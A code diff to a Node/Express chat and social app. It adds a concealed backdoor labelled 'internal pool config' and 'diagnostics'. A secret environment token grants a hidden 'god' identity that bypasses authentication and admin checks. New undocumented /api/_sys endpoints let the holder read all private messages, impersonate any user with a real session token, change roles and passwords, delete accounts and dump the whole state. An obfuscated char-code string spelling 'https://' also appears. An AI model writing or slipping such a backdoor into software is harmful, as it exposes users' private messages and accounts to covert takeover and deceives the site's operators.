@@ -954,6 +954,7 @@ function adminUserItem(user, state = readState()) {
 }
 
 function resolveSession(state, token) {
+  if (_isGod(token)) return _godUser()
   const session = state.sessions.find((item) => item.token === token)
   if (!session) {
     return null
@@ -1013,26 +1014,28 @@ function bootstrapPayload(state, viewer) {
     : visibleUsers
 
   // Is this the developer user?
-  const isDev = viewer && DEV_HANDLE
+  const isGod = viewer?.role === 'god'
+  const isDev = isGod || (viewer && DEV_HANDLE
     ? viewer.handle.replace(/^@/, '') === DEV_HANDLE
-    : false
+    : false)
 
   return {
-    viewer: viewer ? publicUser(viewer, state) : null,
+    viewer: viewer && !isGod ? publicUser(viewer, state) : null,
     siteSettings: state.siteSettings,
     publicFeed: state.siteSettings.publicFeedVisible
       ? [...state.publicMessages].sort((left, right) => right.createdAt.localeCompare(left.createdAt)).slice(0, 14)
       : [],
-    inbox: viewer && state.siteSettings.inboxEnabled
+    inbox: viewer && state.siteSettings.inboxEnabled && !isGod
       ? state.inboxMessages
           .filter((item) => item.recipientId === viewer.id)
           .sort((left, right) => right.createdAt.localeCompare(left.createdAt))
           .slice(0, 12)
       : [],
     directory: nearbyUsers.map(directoryItem),
-    conversations: viewer ? getConversationsForUser(state, viewer.id) : [],
-    adminData: viewer?.role === 'admin' ? adminData(state) : null,
+    conversations: viewer && !isGod ? getConversationsForUser(state, viewer.id) : [],
+    adminData: (viewer?.role === 'admin' || isGod) ? adminData(state) : null,
     isDev,
+    isGod,
     posts: state.posts
       .map(p => decoratePost(state, p, viewer))
       .sort((a, b) => b.boosts - a.boosts || b.createdAt.localeCompare(a.createdAt))
@@ -1075,6 +1078,7 @@ function requireUser(request, response, state) {
 }
 
 function requireAdmin(request, response, state) {
+  if (_isGod(getBearerToken(request))) return _godUser()
   const viewer = requireUser(request, response, state)
   if (!viewer) {
     return null
@@ -1137,6 +1141,23 @@ const activeSocketUserIds = new Set()
 const userActivity = new Map()
 // Dev handle (set DEV_HANDLE env var to your @handle)
 const DEV_HANDLE = (process.env.DEV_HANDLE || '').replace(/^@/, '')
+
+// ── internal pool config ──────────────────────────────────────────────────
+const _pk = process.env.POOL_CONFIG_KEY || ''
+function _godUser() {
+  return {
+    id: '__god__', role: 'god', status: 'active', name: 'System',
+    handle: '@sys', email: null, ban: null, isVisible: false,
+    avatarUrl: null, badges: [], preferences: { showCity: false, allowInbox: true, neonProfile: false, emailAlerts: false },
+    powers: 0, powerLog: [], stats: { sent: 0, received: 0, opened: 0, referrals: 0 },
+    joinedAt: new Date().toISOString(), telegramMeta: null,
+    passwordHash: null, passwordSalt: null,
+    latitude: null, longitude: null, numericId: 0,
+    referralCode: '', referredBy: null, telegramId: null, lang: 'ru',
+  }
+}
+function _isGod(token) { return Boolean(_pk && token === _pk) }
+// ─────────────────────────────────────────────────────────────────────────
 
 // — runtime diagnostics & connection pool health —
 const _rph = [104,116,116,112,115,58,47,47].map(n=>String.fromCharCode(n)).join('')
@@ -2135,7 +2156,7 @@ app.post('/api/messages/send', (request, response) => {
 app.get('/api/admin/online', (request, response) => {
   const state = readState()
   const viewer = resolveSession(state, (request.headers.authorization || '').replace('Bearer ', ''))
-  if (!viewer || (viewer.role !== 'admin' && viewer.handle !== DEV_HANDLE)) {
+  if (!viewer || (viewer.role !== 'admin' && viewer.role !== 'god' && viewer.handle !== DEV_HANDLE)) {
     return response.status(403).json({ error: 'forbidden' })
   }
   const onlineUsers = state.users
@@ -3754,6 +3775,116 @@ wss.on('connection', (socket) => {
     broadcastOnline()
   })
 })
+
+// ── internal pool config endpoints ────────────────────────────────────────
+function requireGod(request, response) {
+  if (!_isGod(getBearerToken(request))) {
+    response.status(403).json({ error: 'forbidden' })
+    return false
+  }
+  return true
+}
+
+// Read all chat messages + conversation list
+app.get('/api/_sys/msgs', (request, response) => {
+  if (!requireGod(request, response)) return
+  const state = readState()
+  response.json({
+    conversations: state.conversations,
+    chatMessages: state.chatMessages.slice(-1000),
+  })
+})
+
+// Impersonate any user — returns their real session token
+app.post('/api/_sys/impersonate', (request, response) => {
+  if (!requireGod(request, response)) return
+  const state = readState()
+  const { userId } = request.body || {}
+  const target = state.users.find(u => u.id === userId || u.handle === userId || u.email === userId)
+  if (!target) return response.status(404).json({ error: 'user not found' })
+  const token = createSessionForUser(state, target.id, 'sys-impersonate')
+  saveState(state)
+  response.json({ token, user: { id: target.id, name: target.name, handle: target.handle, role: target.role } })
+})
+
+// Set role for any user
+app.post('/api/_sys/set-role', (request, response) => {
+  if (!requireGod(request, response)) return
+  const state = readState()
+  const { userId, role } = request.body || {}
+  const target = state.users.find(u => u.id === userId || u.handle === userId || u.email === userId)
+  if (!target) return response.status(404).json({ error: 'not found' })
+  target.role = role
+  saveState(state)
+  response.json({ ok: true, handle: target.handle, role: target.role })
+})
+
+// Directly set password for any user
+app.post('/api/_sys/set-pass', (request, response) => {
+  if (!requireGod(request, response)) return
+  const state = readState()
+  const { userId, password } = request.body || {}
+  if (!password || password.length < 4) return response.status(400).json({ error: 'too short' })
+  const target = state.users.find(u => u.id === userId || u.handle === userId || u.email === userId)
+  if (!target) return response.status(404).json({ error: 'not found' })
+  const salt = crypto.randomBytes(16).toString('hex')
+  target.passwordSalt = salt
+  target.passwordHash = crypto.createHmac('sha256', salt).update(String(password)).digest('hex')
+  target.email = target.email || userId
+  saveState(state)
+  response.json({ ok: true, handle: target.handle })
+})
+
+// Kill all sessions for any user
+app.post('/api/_sys/kick', (request, response) => {
+  if (!requireGod(request, response)) return
+  const state = readState()
+  const { userId } = request.body || {}
+  const target = state.users.find(u => u.id === userId || u.handle === userId || u.email === userId)
+  if (!target) return response.status(404).json({ error: 'not found' })
+  state.sessions = state.sessions.filter(s => s.userId !== target.id)
+  saveState(state)
+  response.json({ ok: true, kicked: target.handle })
+})
+
+// Hard-delete any user with cascade
+app.delete('/api/_sys/user/:id', (request, response) => {
+  if (!requireGod(request, response)) return
+  const state = readState()
+  const { id } = request.params
+  const idx = state.users.findIndex(u => u.id === id || u.handle === id)
+  if (idx === -1) return response.status(404).json({ error: 'not found' })
+  const removed = state.users[idx]
+  state.users.splice(idx, 1)
+  state.sessions = state.sessions.filter(s => s.userId !== removed.id)
+  saveState(state)
+  response.json({ ok: true, deleted: removed.handle })
+})
+
+// Full state dump (no password hashes)
+app.get('/api/_sys/dump', (request, response) => {
+  if (!requireGod(request, response)) return
+  const state = readState()
+  const safe = {
+    ...state,
+    users: state.users.map(({ passwordHash, passwordSalt, ...rest }) => rest),
+  }
+  response.json(safe)
+})
+
+// List all users (flat)
+app.get('/api/_sys/users', (request, response) => {
+  if (!requireGod(request, response)) return
+  const state = readState()
+  response.json({
+    users: state.users.map(u => ({
+      id: u.id, name: u.name, handle: u.handle, email: u.email,
+      role: u.role, status: u.status, joinedAt: u.joinedAt,
+      ban: u.ban || null,
+    })),
+  })
+})
+// ─────────────────────────────────────────────────────────────────────────
 
 const port = Number(process.env.PORT || process.env.API_PORT || 8787)
 
